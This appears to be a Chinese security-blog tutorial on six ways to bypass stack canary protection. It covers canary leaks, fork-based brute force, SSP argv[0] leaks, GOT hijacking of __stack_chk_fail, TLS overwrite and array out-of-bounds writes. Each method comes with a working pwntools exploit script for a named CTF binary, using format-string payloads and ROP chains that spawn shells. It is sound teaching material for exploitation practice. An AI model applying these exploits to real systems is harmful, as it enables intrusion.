@@ -1,0 +1,469 @@
+# 绕过canary保护的6种方法
+
+阅读量 **873295**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-12-29 15:30:50
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t011f507956a6c4ef8f.jpg)
+
+## 简介
+
+canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs/gs寄存器取值放在rbp-4或者rbp-8的位置（32位/64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs/gs寄存器对应位置的值进行比较，如果不相等就会执行__
+stack_chk_fail函数，这个函数强行停止程序运行并发出警告，从而阻止栈溢出攻击。当然，这种保护并不是万无一失的，下面我将会列举出6种绕过canary的方法，每种方法多少都有一定的限制，具体还是要依据题目来决定采用何种方法。
+
+下面列举一个64位下的canary保护运行机制：
+
+程序开启canary保护后，在运行开始会从fs寄存器偏移为0x28的位置中取出8字节放入rax寄存器中，之后rax会将其放在rbp-8的位置，最后将rax的值清零
+
+![](https://p2.ssl.qhimg.com/t016856e7775aa9513c.png)
+
+程序接收我们的输入后会进行检查，如果canary被覆盖就会执行stack_chk_fail函数从而阻止程序继续运行
+
+![](https://p5.ssl.qhimg.com/t015f27646a756662ef.png)
+
+![](https://p5.ssl.qhimg.com/t017badbcc679dc4b5c.png)
+
+## leak绕过
+
+通过泄露canary来绕过canary，常见的有覆盖掉前面的\x00让输出函数泄露，还有printf定点泄露。
+
+### **stackguard1**
+
+一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax
+
+![](https://p2.ssl.qhimg.com/t01f9c21254ab365a0d.png)
+
+程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail[@plt](https://github.com/plt
+"@plt")位置，强行结束进程并弹出警告
+
+![](https://p2.ssl.qhimg.com/t0157a062868db8d749.png)
+
+分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。
+
+![](https://p0.ssl.qhimg.com/t016c457b67f7a24a14.png)
+
+通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，我们可以利用这个后门函数获取到shell
+
+![](https://p1.ssl.qhimg.com/t01463e13173c8fdb2d.png)
+
+继续分析，程序存在两次输入，一次gets输入，一次read输入，中间存在printf函数，可以对任意地址进行泄露
+
+![](https://p4.ssl.qhimg.com/t0156dfed2c52b1d35b.png)
+
+接下来read读取时，允许读取的0x60个字符，但是在0x28处就遇到canary，0x38就是返回地址，明显存在栈溢出
+
+![](https://p0.ssl.qhimg.com/t01ef19ed7a8e273422.png)
+
+![](https://p1.ssl.qhimg.com/t01f3047e2e6fe433a8.png)
+
+所以思路基本就是，先利用第一次输入泄露canary，在第二次输入时绕过canary并修改返回地址到back_door
+
+因为是gets函数最后会补上\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary
+
+![](https://p1.ssl.qhimg.com/t01d9b5d4f51b4e3546.png)
+
+获取gadget
+
+![](https://p0.ssl.qhimg.com/t0186fbf73e701b156b.png)
+
+###  EXP
+
+    
+    
+    from pwn import *
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    back_door = 0x4011d6
+    """ ROPgadget --binary stackguard1 --only """pop|ret"|grep "rdi" """
+    pop_rdi_ret = 0x0401343
+    bin_sh = 0x402004
+    #p = process('./stackguard1')
+    p = remote('123.57.230.48',12344)
+    payload1 = '%11$p'  # 泄露canary
+    p.sendline(payload1)
+    canary=int(p.recv(),16)  # 接受canary
+    print canary
+    p.sendline('a'*0x28+p64(canary)+'a'*8+p64(back_door))
+    #gdb.attach(p,'b main')
+    p.interactive()
+    
+
+## one by one爆破
+
+one by
+one爆破思想是利用fork函数来不断逐字节泄露。这里介绍一下fork函数，fork函数作用是通过系统调用创建一个与原来进程几乎完全相同的进程，这里的相同也包括canary。当程序存在fork函数并触发canary时，__
+stack_chk_fail函数只能关闭fork函数所建立的进程，不会让主进程退出，所以当存在大量调用fork函数时，我们可以利用它来一字节一字节的泄露，所以叫做one
+by one爆破。
+
+###  bin1
+
+程序中存在fork函数，而且还是不断循环，符合one by
+one爆破条件，因为是32位程序，canary第一个字符是\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF
+
+![](https://p0.ssl.qhimg.com/t0129702ba3dab3eec4.png)
+
+爆破原理：
+
+我们每次尝试多溢出一字节，如果接收到进程错误退出就尝试另一种字符；如果接收到正常返回就继续溢出一字节，直到canary被完全泄露。因为没有远端环境加上没有flag文件，所以是get
+flag error
+
+![](https://p4.ssl.qhimg.com/t010a661bf8d59de308.png)
+
+###  EXP
+
+    
+    
+    from pwn import *
+    local = 1
+    elf = ELF('./bin1')
+    
+    if local:
+        p = process('./bin1')
+        libc = elf.libc
+    
+    else:
+        p = remote('',)
+        libc = ELF('./')
+    p.recvuntil('welcome\n')
+    canary = '\x00'
+    for k in range(3):
+        for i in range(256):
+            print "index " + str(k) + ": " + chr(i)
+            p.send('a'*100 + canary + chr(i))
+            a = p.recvuntil("welcome\n")
+            print a
+            if "sucess" in a:
+                    canary += chr(i)
+                    print "canary: " + canary
+                    break
+    addr = 0x0804863B
+    payload = 'A' * 100 + canary + 'A' * 12 + p32(addr)
+    
+    p.send(payload)
+    p.interactive()
+    
+
+## ssp攻击
+
+当程序检测到栈溢出时，程序会执行 **stack_chk_fail函数，而**
+stack_chk_fail函数作用是阻断程序继续执行，并输出argv[0]警告，而ssp攻击原理是通过输入足够长的字符串覆盖掉argv[0]，这样就能让canary保护输出我们想要地址上的值。
+
+**注意：这个方法在glibc2.27及以上的版本中已失效**
+
+    
+    
+    void
+    __attribute__ ((noreturn))
+    __stack_chk_fail (void) {
+        __fortify_fail ("stack smashing detected");
+    }
+    
+    void
+    __attribute__ ((noreturn))
+    __fortify_fail (msg)
+       const char *msg; {
+          /* The loop is added only to keep gcc happy. */
+             while (1)
+                  __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") 
+    }
+    libc_hidden_def (__fortify_fail)
+    
+
+上面是
+stack_chk_fail()函数的源码，在libc_message函数中第二个%s输出的就是__libc_argv[0]，argv[0]是指向第一个启动参数字符串的指针。我们可以利用栈溢出将其覆盖成我们想要泄露的地址，当程序触发到canary时就可以泄露我们想要的东西了。
+
+###  smashes
+
+通过反汇编发现程序会进入一个函数，这个函数中存在gets危险函数，可以利用它进行栈溢出操作。
+
+![](https://p1.ssl.qhimg.com/t01c6e557b89525531a.png)
+
+在字符串窗口发现flag字样，根据提示我们可以知道flag就在这里，不过是在远端环境中
+
+![](https://p4.ssl.qhimg.com/t0114bb70f988d2efcd.png)
+
+所以我们只要将argv[0]指向这个地址就可以泄露。
+
+但是后面发现行不通，并没有泄露我们想要泄露的地址里面的值。
+
+![](https://p5.ssl.qhimg.com/t0183f4f964e290ef3a.png)
+
+回到伪代码里面发现下面一行
+
+    
+    
+    memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));
+    
+
+这行代码会将0x600D20这个地址里面的值清空，导致flag被清除。看了一下一些师傅的博客了解到ELF的重映射。
+**当可执行文件足够小的时候，他的不同区段可能会被多次映射。也就是说该flag会在其他地方进行备份。**
+
+![](https://p4.ssl.qhimg.com/t01177947eb281f4ad7.png)
+
+同时还要注意一点，64位下地址都是8的倍数所以最终我们要泄露的地址是0x400d20
+
+###  EXP
+
+    
+    
+    from pwn import *
+    context.log_level = 'debug'
+    p = remote("pwn.jarvisoj.com",9877)
+    p.recvuntil('name? ')
+    p.sendline(p64(0x400d20)*300)
+    p.interactive()
+    
+
+## 劫持___stack_chk_fail
+
+canary保护原理无非就是检测到溢出后调用 **stack_chk_fail函数，所以如果我们能够修改** stack _chk
+_fail函数的got表为后门函数，当检测溢出调用__ stack_chk_fail函数后，程序就不会退出并警告而是执行我们的后门函数。
+
+###  [BJDCTF 2nd]r2t4
+
+进入IDA很容易就发现后门函数
+
+![](https://p5.ssl.qhimg.com/t01ecf64bd4812daaaf.png)
+
+继续分析，程序只存在一次输入输出，但输出却调用printf函数，也就存在格式字符串漏洞，我们可以利用其修改或泄露任意地址
+
+![](https://p4.ssl.qhimg.com/t01786df914e7e14c78.png)
+
+找到canry对应的偏移并利用printf修改 __ stack_chk_fail函数的got表
+
+![](https://p3.ssl.qhimg.com/t019fde7e57760a9e5c.png)
+
+最后获得flag
+
+![](https://p3.ssl.qhimg.com/t0146cc3c7c577f133a.png)
+
+###  EXP
+
+    
+    
+    from pwn import *
+    p = process('./r2t4')
+    elf = ELF('r2t4')
+    back_door = 0x400626
+    __stack_chk_fail_got = elf.got['__stack_chk_fail']
+    payload = "%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail_got+2) + p64(__stack_chk_fail_got)
+    #gdb.attach(p)
+    p.sendline(payload)
+    p.interactive()
+    
+
+## 修改TLS结构体
+
+如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，fs寄存器指向的位置是TLS结构体，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。
+
+TLS结构体如下所示：
+
+![](https://p1.ssl.qhimg.com/t014bf7a4748d62d486.png)
+
+![](https://p4.ssl.qhimg.com/t01141b4848a667b533.png)
+
+###  CTF2018 babystack
+
+拖进IDA里面
+
+![](https://p3.ssl.qhimg.com/t01d8d36363afb0b95c.png)
+
+子进程里面先让用户输入要输入的大小，如果大于0x1000就输出返回不进行读取，如果小于等于就进行读取
+
+![](https://p2.ssl.qhimg.com/t014daa8e474ec4d27e.png)
+
+s的大小是0x1010比0x10000小明显存在栈溢出，我们可以从这里溢出到TLS修改canary，接下来就是确定canary的位置
+
+这里我采取爆破，不断尝试获得canary的位置。先构建好ROP链，控制程序返回到主函数，这样肯定会被检测到异常退出，但是如果我们不断加长ROP链直到覆盖TLS就可以成功执行
+
+![](https://p0.ssl.qhimg.com/t01d35e9a76b99bdad0.png)
+
+确定好位置以后就可以开始构造ROP链，泄露地址puts函数的地址，计算出libcbase，最后利用栈迁移，写one_gadget
+
+获取gadgets
+
+![](https://p5.ssl.qhimg.com/t01fb17d5ee98bc8fd4.png)
+
+之后构造ROP链
+
+    
+    
+    payload = 'a'*0x1010 
+    payload += p64(fakestack)
+    payload += p64(pop_rdi_ret)
+    payload += p64(puts_got)
+    payload += p64(puts_plt)
+    payload += p64(pop_rdi_ret)
+    payload += p64(0)
+    payload += p64(pop_rsi_r15_ret)
+    payload += p64(fakestack)
+    payload += p64(0)
+    payload += p64(read_plt)
+    payload += p64(leave_ret)
+    payload += 'a'*(offset - len(payload))
+    
+
+  1. p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)输出puts的地址
+  2. p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(fakestack)+p64(0)+p64(read_plt)组装read函数向fakestack写东西
+
+获取one_gadget
+
+![](https://p5.ssl.qhimg.com/t011e9163845fb40743.png)
+
+###  EXP
+
+    
+    
+    from pwn import *
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    
+    p = process('./babystack')
+    elf = ELF('babystack')
+    libc = elf.libc
+    
+    main_addr = 0x4009E7
+    offset = 6128
+    bss_start = elf.bss()
+    fakestack = bss_start + 0x100
+    pop_rdi_ret = 0x400c03
+    pop_rsi_r15_ret = 0x400c01
+    leave_ret = 0x400955
+    read_plt = elf.symbols["read"]
+    puts_got = elf.got["puts"]
+    puts_plt = elf.symbols["puts"]
+    puts_libc = libc.symbols["puts"]
+    read_plt = elf.symbols["read"]
+    
+    p.recvuntil("send?")
+    p.sendline(str(offset))
+    payload = 'a'*0x1010 
+    payload += p64(fakestack)
+    payload += p64(pop_rdi_ret)
+    payload += p64(puts_got)
+    payload += p64(puts_plt)
+    payload += p64(pop_rdi_ret)
+    payload += p64(0)
+    payload += p64(pop_rsi_r15_ret)
+    payload += p64(fakestack)
+    payload += p64(0)
+    payload += p64(read_plt)
+    payload += p64(leave_ret)
+    payload += 'a'*(offset - len(payload))
+    p.send(payload)
+    
+    p.recvuntil("goodbye.\n")
+    puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))
+    print hex(puts_addr)
+    getshell_libc = 0x4527a #0x45226 0x4527a 0xf03a4 0xf1247
+    base_addr = puts_addr - puts_libc
+    one_gadget = base_addr + getshell_libc
+    
+    payload2 = p64(0x12345678)
+    payload2 += p64(one_gadget)
+    p.send(payload2)
+    
+    p.interactive()
+    
+
+![](https://p0.ssl.qhimg.com/t0130e273cb158d79fd.png)
+
+## 数组下标越界
+
+当程序中存在数组，没有对边界进行检查时，如果我们可以对数组进行对应位置修改，我们就可以绕过canary检测，直接修改返回地址
+
+例如，我们可以对arr数组任意位置进行修改，这就存在数组下标溢出，以下图为例，返回地址在数组中就相当于arr[6]，如果我们对arr[6]进行修改就是对返回地址进行修改
+
+![](https://p4.ssl.qhimg.com/t01544768b1fd40b1f5.png)
+
+###  homework
+
+直接进IDA里面观察，发现存在后门函数
+
+![](https://p2.ssl.qhimg.com/t014dd94774af36b96c.png)
+
+继续分析
+
+![](https://p2.ssl.qhimg.com/t01c01817a4f5c84802.png)
+
+这里没有对数组进行检查，我们可以利用它来修改返回地址，接下来就是寻找返回地址对应位置
+
+![](https://p5.ssl.qhimg.com/t019b3e3f0750b6144f.png)
+
+所以我们只需要将arr[14]修改成后面函数地址即可拿到shell
+
+###  EXP
+
+    
+    
+    from pwn import *
+    context.log_level = 'debug'
+    context.terminal = ['gnome-terminal','-x','bash','-c']
+    context(arch='i386', os='linux')
+    elf = ELF('./homework')
+    p = process('./homework')
+    libc = elf.libc
+    p.recvuntil("What's your name? ")
+    p.sendline("aaaa")
+    p.recvuntil("4 > dump all numbers")
+    p.recvuntil(" > ")
+    gdb.attach(p)
+    p.sendline("1")
+    p.recvuntil("Index to edit: ")
+    p.sendline("14")
+    p.recvuntil("How many? ")
+    system_addr = 0x080485FB
+    p.sendline(str(system_addr))
+    p.sendline('0')
+    p.interactive()
+    
+
+![](https://p4.ssl.qhimg.com/t013bd8e1d64cb10064.png)
+
+## 总结
+
+以上就是我所总结绕过canary的方法，可能写得不太好或者不够全面，但希望可以帮助到大家
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Krito** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/262846](/post/id/262846)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Pwn](/tag/Pwn)
+  * [canary](/tag/canary)
+
+ **+1** __11赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=KgB4aib6diaHnNvSESX2ztKw&s=40&t=1623720050)
+Krito
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
